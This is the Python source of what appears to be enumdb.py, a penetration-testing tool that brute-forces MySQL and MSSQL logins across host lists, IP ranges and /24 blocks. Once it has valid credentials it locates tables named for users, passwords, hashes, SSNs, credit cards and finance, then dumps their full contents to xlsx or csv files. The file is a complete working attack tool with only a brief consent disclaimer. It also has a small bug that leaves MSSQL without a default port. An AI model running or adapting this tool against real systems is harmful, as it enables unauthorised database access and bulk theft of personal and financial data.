#!/usr/bin/env python3

# Author: m8r0wn
# License: GPL-3.0

# Disclaimer:
# This tool was designed to be used only with proper
# consent. Use at your own risk.

import argparse
import MySQLdb
import pymssql
import re
from openpyxl import Workbook
from sys import exit, argv
from os import path, remove

class create_xlsx():
    def __init__(self, outfile, host, dbtype):
        self.outfile = outfile
        self.create_workbook()
        self.create_overview(host, dbtype)

    def create_workbook(self):
        self.wb = Workbook()

    def save_workbook(self, filename):
        self.wb.save(filename)  # save new workbook

    def create_overview(self, host, dbtype):
        #Create enum overview on sheet1
        self.ws0 = self.wb.active
        self.ws0.title = "Overview"
        self.ws0['A1'] = "Target:"
        self.ws0['B1'] = host
        self.ws0['A2'] = "DB Type:"
        self.ws0['B2'] = dbtype
        self.ws0['A4'] = "DB"
        self.ws0['B4'] = "Table"
        self.ws0['C4'] = "Key Word"
        self.sheet1_row = 5

    def addto_overview(self, db, table, keyword):
        #Add db,table,and keyword to sheet1
        self.ws0.cell(row=self.sheet1_row, column=1, value=str(db))
        self.ws0.cell(row=self.sheet1_row, column=2, value=str(table))
        self.ws0.cell(row=self.sheet1_row, column=3, value=str(keyword))
        self.sheet1_row += 1

    def create_sheet(self, db, table, header, data):
        #Create new sheet for each table and add table data
        ws = self.wb.create_sheet(table[0:15])
        row_count = 1
        col_count = 1
        ws['A1'] = "[+] Enumerating:  {}.{}".format(db, table)
        row_count += 1
        for x in header:
            ws.cell(row=row_count, column=col_count, value=str(x[0]))
            col_count += 1
        col_count = 1
        row_count += 1
        for row in data:
            for item in row:
                ws.cell(row=row_count, column=col_count, value=str(item))
                col_count += 1
            col_count = 1
            row_count += 1
        self.save_workbook(self.outfile)

class enum_db():
    #Terms to search for in table name (all lowercase)
    search_tables = ['user', 'users','login','logon','config','hr',
                 'finance','cash', 'account','accounts','password',
                 'passwords', 'passwd','hash','hashes','ssn','cc',
                 'credit_cards', 'creditcards','credit cards',
                 'social', 'socials']

    def db_connect(self, dbtype, host, port, user, passwd):
        try:
            if dbtype == "mysql":
                con = MySQLdb.connect(host=host, port=port, user=user, password=passwd, connect_timeout=3)
                con.query_timeout = 20
            elif dbtype == "mssql":
                con = pymssql.connect(server=host, port=port, user=user, password=passwd, login_timeout=3, timeout=3)
            print_success("Connection established {}:{}@{}".format(user,passwd,host))
            return con
        except:
            print_failure("Login failed {}:{}@{}".format(user,passwd,host))
            return False

    def db_query(self,con, cmd):
        cur = con.cursor()
        cur.execute(cmd)
        data = cur.fetchall()
        cur.close()
        return data

    def db_closing(self,count, host):
        if count > 0:
            print_status("{} tables enumerated for {}".format(count, host))
        else:
            print_failure("{} table(s) enumerated for {}\n".format(count, host))

    def mysql_enum(self, con, outfile, host, dbtype, excel):
        table_count = 0
        for database in self.db_query(con, "show databases;"):
            self.db_query(con, "use {};".format(database[0]))
            for table in self.db_query(con, "show tables;"):
                complete_tables = []
                for t in self.search_tables:
                    if t in table[0].lower() and table[0] not in complete_tables:
                        complete_tables.append(table[0])
                        header = self.db_query(con, "SHOW COLUMNS FROM {}".format(table[0]))
                        data = self.db_query(con, "SELECT * FROM {}".format(table[0]))
                        if data and excel: #Write to xlsx
                            if table_count == 0:
                                #Create xlsx workbook on first found data
                                xlsx = create_xlsx(outfile, host, dbtype)
                            print_success("Enumerating {}:{}".format(database[0], table[0]))
                            xlsx.addto_overview(database[0], table[0], t)
                            xlsx.create_sheet(database[0], table[0], header, data)
                            table_count += 1
                        elif data: #Write to csv
                            write_csv(outfile, header, data, database[0], table[0])
                            table_count += 1
                        else:
                            print_empty('Empty data set {}:{}'.format(database[0], table[0]))
        con.close()
        self.db_closing(table_count, host)

    def mssql_enum(self,con, outfile, host, dbtype, excel):
        table_count = 0
        for database in self.db_query(con, "SELECT NAME FROM sys.Databases;"):
            for table in self.db_query(con, "SELECT NAME FROM {}.sys.tables;".format(database[0])):
                complete_tables = []
                for t in self.search_tables:
                    if t in table[0].lower() and table[0] not in complete_tables:
                        complete_tables.append(table[0])
                        header = self.db_query(con, "USE {};SELECT column_name FROM information_schema.columns WHERE table_name = '{}';".format(database[0],table[0]))
                        data = self.db_query(con, "SELECT * FROM {}.dbo.{};".format(database[0],table[0]))
                        if data and excel: #Write to xlsx
                            if table_count == 0:
                                #Create xlsx workbook on first found data
                                xlsx = create_xlsx(outfile, host, dbtype)
                            print_success("Enumerating {}:{} @  {}".format(database[0], table[0], host))
                            xlsx.addto_overview(database[0], table[0], t)
                            xlsx.create_sheet(database[0], table[0], header, data)
                            table_count += 1
                        elif data: #Write to csv
                            write_csv(outfile, header, data, database[0], table[0])
                            table_count += 1
                        else:
                            print_empty('Empty data set {}:{} @ {}'.format(database[0], table[0], host))
        con.close()
        self.db_closing(table_count, host)

def write_csv(outfile, header, data, database, table):
    # After table enumeration, write to csv
    print_success("Enumerating {}:{}".format(database, table))
    write_file(outfile, "[+] Enumerating {}:{}\n".format(database, table))
    for x in header:
        write_file(outfile, "{},".format(x[0]))
    write_file(outfile, "\n")
    data_count = 0
    while data_count != len(data):
        for y in data[data_count]:
            write_file(outfile, "{},".format(y))
        data_count += 1
        write_file(outfile, "\n")
    write_file(outfile, "\n\n\n")

def outfile_prep(file):
    #check if file exists and prompt user to delete
    if path.exists(file):
        print("\n");print_failure("Output file '{}' exists in current directory.".format(file))
        delete_old = input("\033[1;34m[*]\033[1;m Do you want to delete and continue? [y/N]: ")
        if delete_old not in ['y', 'Y']:
            exit(0)
        remove(file)
    return file

def write_file(file, data):
    if path.exists(file):
        option = 'a'
    else:
        option = 'w'
    OpenFile = open(file, option)
    OpenFile.write('%s' % (data))
    OpenFile.close()

def print_success(msg):
    print('\033[1;32m[+]\033[1;m', msg)

def print_status(msg):
    print('\033[1;34m[*]\033[1;m', msg)

def print_failure(msg):
    print('\033[1;31m[-]\033[1;m', msg)

def print_empty(msg):
    print('\033[1;33m[-]\033[1;m', msg)

def get_val(flag):
    return argv[argv.index(flag) + 1]

def file_exists(parser, filename, rtnlist):
    #used with argparse to check file name exists
    if not path.exists(filename):
        parser.error("Input file not found: {}".format(filename))
    if rtnlist == 'list':
        return [x.strip() for x in open(filename)]
    else:
        return filename

def list_targets(t):
    hosts = []
    ip = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    iprange = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\-\d{1,3}$")
    dns = re.compile("^.+\.[a-z|A-Z]{2,}$")
    cidr = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/24$")
    try:
        #txt File
        if t.endswith(".txt"):
            if path.exists(t):
                return [ip.strip() for ip in open(t)]
            else:
                raise Exception("001: host file not found")
        #multiple 127.0.0.1,yahoo.com
        elif "," in t:
            for x in t.split(","):
                hosts.append(x)
        #Cidr /24
        elif cidr.match(t):
            a = t.split("/")[0].split(".")
            for x in range(0, 256):
                target = a[0] + "." + a[1] + "." + a[2] + "." + str(x)
                hosts.append(target)
        #Range 127.0.0.1-50
        elif iprange.match(t):
            a,b = t.split("-")
            c = a.split(".")
            for x in range(int(c[2]), int(b)+1):
                hosts.append(c[0]+"."+c[1]+"."+c[2]+"."+str(x))
        #Single IP match
        elif ip.match(t):
            hosts.append(t)
        #Dns name
        elif dns.match(t):
            hosts.append(t)
        #no match
        else:
            raise Exception("002: invalid target provided")
        return hosts
    except Exception as e:
        print("[!] List_Target Error " + str(e))
        exit(1)

def default_port(db):
    if db == "mysql":
        return 3306
    elif db == "mysql":
        return 1433

def file_ext(excel):
    if not excel:
        return "csv"
    else:
        return "xlsx"

def main(args, targets):
    try:
        print_status("Starting enumdb.py\n"+"-"*25)
        scan = enum_db()
        for t in targets:
            #One output file per target will be created
            for user in args.users:
                for passwd in args.password:
                    con = scan.db_connect(args.dbtype, t, args.port, user, passwd)
                    if con and not args.brute:
                        if args.dbtype == "mysql":
                            scan.mysql_enum(con, outfile_prep("{}_enumdb.{}".format(t[-6:], file_ext(args.excel))), t, args.dbtype, args.excel)
                        elif args.dbtype == 'mssql':
                            scan.mssql_enum(con, outfile_prep("{}_enumdb.{}".format(t[-6:], file_ext(args.excel))), t, args.dbtype, args.excel)
    except KeyboardInterrupt:
        print("\n[!] Key Event Detected...\n\n")
        exit(0)

if __name__ == '__main__':
    version = "1.1"
    try:
        args = argparse.ArgumentParser(description="""
                   {0}   v.{1}
    --------------------------------------------------
Brute force MySQL or MSSQL database logins. Once provided with valid
credentials, enumdb will attempt to enumerate tables containing
sensitive information such as: users, passwords, ssn, etc.

** Having trouble with inputs? Use '' around username & password **

Usage:
    python3 enumdb.py -u root -p Password1 -t mysql 10.11.1.30
    python3 enumdb.py -u root -p '' -t mysql -brute 10.0.0.0-50
    python3 enumdb.py -u 'domain\\user1 -P pass.txt -t mssql 192.168.1.7""".format(argv[0], version), formatter_class=argparse.RawTextHelpFormatter, usage=argparse.SUPPRESS)
        user = args.add_mutually_exclusive_group(required=True)
        user.add_argument('-u', dest='users', type=str, action='append', help='Single username, OR')
        user.add_argument('-U', dest='users', default=False, type=lambda x: file_exists(args, x, 'list'), help='Users.txt file')
        passwd = args.add_mutually_exclusive_group(required=True)
        passwd.add_argument('-p', dest='password', action='append', default=[], help='Single password, OR')
        passwd.add_argument('-P', dest='password', default=False, type=lambda x: file_exists(args, x, 'list'), help='Password.txt file')

        args.add_argument('-t', dest='dbtype', type=str, required=True, help='Database types: mssql, mysql')
        args.add_argument('-port', dest='port', type=int, default=0, help='Specify Non-standard port')
        args.add_argument('-csv', dest="excel", action='store_false', help='CSV output file (Default: xlsx)')
        args.add_argument('-brute', dest="brute", action='store_true', help='Brute force only, do not enumerate')

        args.add_argument(dest='targets', nargs='+', help='Target database server(s)')
        args = args.parse_args()

        #Define default port based on dbtype
        if args.port == 0: args.port = default_port(args.dbtype)

        #Launch Main
        main(args, list_targets(args.targets[0]))
    except KeyboardInterrupt:
        print("\n[!] Key Event Detected...\n\n")
        exit(0)